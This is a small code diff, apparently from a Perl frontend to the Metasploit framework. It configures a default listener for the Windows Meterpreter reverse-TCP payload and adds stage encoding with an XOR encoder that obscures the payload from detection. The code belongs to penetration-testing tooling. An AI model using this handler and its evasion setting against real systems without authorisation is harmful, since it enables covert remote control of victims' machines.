@@ -182,7 +182,9 @@ sub createDefaultHandler {
 		PAYLOAD => "windows/meterpreter/reverse_tcp",
 		LHOST => "0.0.0.0",
 		LPORT => $port,
-		ExitOnSession => "false"
+		ExitOnSession => "false",
+		EnableStageEncoding => "true",
+		StageEncoder => "x86/call4_dword_xor"
 	));
 }
 
